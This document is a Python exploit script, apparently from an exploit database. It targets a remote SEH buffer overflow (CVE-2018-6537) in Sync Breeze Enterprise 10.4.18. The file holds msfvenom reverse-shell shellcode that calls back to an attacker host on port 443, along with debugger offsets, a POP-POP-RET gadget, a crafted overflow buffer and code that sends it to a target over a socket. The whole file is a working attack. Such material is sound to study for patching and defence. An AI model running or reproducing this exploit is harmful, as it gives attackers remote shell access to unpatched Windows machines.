#!/usr/bin/env python3

# Exploit Title: Sync Breeze Enterprise 10.4.18 - Remote Buffer Overflow (SEH)
# Date: 20250202
# Exploit Author: Artur [ajes] Szymczak
# Vendor Homepage: http://www.syncbreeze.com/
# Version: 10.4.18
# Tested on: Windows 10 EN x86 - build: 10.0.16299
# CVE: CVE-2018-6537

import socket
import struct

# target
host = "192.168.1.211"
port = 9121

# 0x00, 0x02, 0x0a 0x0d
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.16 LPORT=443 EXITFUNC=thread -f python -v shellcode –e x86/shikata_ga_nai -b "\x00\x02\x0a\x0d"
shellcode =  b""
shellcode += b"\xb8\x80\xa8\x2c\xbb\xda\xc3\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x52\x31\x43\x12\x03\x43\x12"
shellcode += b"\x83\x6b\x54\xce\x4e\x97\x4d\x8d\xb1\x67\x8e"
shellcode += b"\xf2\x38\x82\xbf\x32\x5e\xc7\x90\x82\x14\x85"
shellcode += b"\x1c\x68\x78\x3d\x96\x1c\x55\x32\x1f\xaa\x83"
shellcode += b"\x7d\xa0\x87\xf0\x1c\x22\xda\x24\xfe\x1b\x15"
shellcode += b"\x39\xff\x5c\x48\xb0\xad\x35\x06\x67\x41\x31"
shellcode += b"\x52\xb4\xea\x09\x72\xbc\x0f\xd9\x75\xed\x9e"
shellcode += b"\x51\x2c\x2d\x21\xb5\x44\x64\x39\xda\x61\x3e"
shellcode += b"\xb2\x28\x1d\xc1\x12\x61\xde\x6e\x5b\x4d\x2d"
shellcode += b"\x6e\x9c\x6a\xce\x05\xd4\x88\x73\x1e\x23\xf2"
shellcode += b"\xaf\xab\xb7\x54\x3b\x0b\x13\x64\xe8\xca\xd0"
shellcode += b"\x6a\x45\x98\xbe\x6e\x58\x4d\xb5\x8b\xd1\x70"
shellcode += b"\x19\x1a\xa1\x56\xbd\x46\x71\xf6\xe4\x22\xd4"
shellcode += b"\x07\xf6\x8c\x89\xad\x7d\x20\xdd\xdf\xdc\x2d"
shellcode += b"\x12\xd2\xde\xad\x3c\x65\xad\x9f\xe3\xdd\x39"
shellcode += b"\xac\x6c\xf8\xbe\xd3\x46\xbc\x50\x2a\x69\xbd"
shellcode += b"\x79\xe9\x3d\xed\x11\xd8\x3d\x66\xe1\xe5\xeb"
shellcode += b"\x29\xb1\x49\x44\x8a\x61\x2a\x34\x62\x6b\xa5"
shellcode += b"\x6b\x92\x94\x6f\x04\x39\x6f\xf8\xeb\x16\x6e"
shellcode += b"\xe8\x83\x64\x70\x09\xef\xe0\x96\x63\x1f\xa5"
shellcode += b"\x01\x1c\x86\xec\xd9\xbd\x47\x3b\xa4\xfe\xcc"
shellcode += b"\xc8\x59\xb0\x24\xa4\x49\x25\xc5\xf3\x33\xe0"
shellcode += b"\xda\x29\x5b\x6e\x48\xb6\x9b\xf9\x71\x61\xcc"
shellcode += b"\xae\x44\x78\x98\x42\xfe\xd2\xbe\x9e\x66\x1c"
shellcode += b"\x7a\x45\x5b\xa3\x83\x08\xe7\x87\x93\xd4\xe8"
shellcode += b"\x83\xc7\x88\xbe\x5d\xb1\x6e\x69\x2c\x6b\x39"
shellcode += b"\xc6\xe6\xfb\xbc\x24\x39\x7d\xc1\x60\xcf\x61"
shellcode += b"\x70\xdd\x96\x9e\xbd\x89\x1e\xe7\xa3\x29\xe0"
shellcode += b"\x32\x60\x49\x03\x96\x9d\xe2\x9a\x73\x1c\x6f"
shellcode += b"\x1d\xae\x63\x96\x9e\x5a\x1c\x6d\xbe\x2f\x19"
shellcode += b"\x29\x78\xdc\x53\x22\xed\xe2\xc0\x43\x24"

# info from debugging:
## !exchain:
### 01d5ff54: 33654132
## offsets:
### exchandler: 128

## gadgets:
# .load narly
# !nmod
# $><G:\find_ppr.wds
### 0x1015a2f0: pop eax; pop ebx; ret


# payload (1000):
filler      = b"A" * 124
sjmp        = b"\xEB\x06\x90\x90"           # JMP short 0x08        NSEH
eip         = struct.pack("<I", 0x1015a2f0) # POP,POP,RET           SEH
jmp         = b"\x66\x81\xC4\x30\x08" + b"\xFF\xE4" # ADD SP,830; JMP ESP

nops        = b"\x90" * 509
payload     = filler + sjmp + eip + jmp + nops + shellcode + b"A"

###
# buffer:
header =  b"\x75\x19\xba\xab"
header += b"\x03\x00\x00\x00"
header += b"\x00\x40\x00\x00"
header += struct.pack('<I', len(payload))
header += struct.pack('<I', len(payload))
header += struct.pack('<I', payload[-1])
buffer = header + payload

try:
    print("\nSending evil buffer...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(buffer)
    s.close()

    print("\nDone!")

except socket.error:
    print("\nCould not connect!")

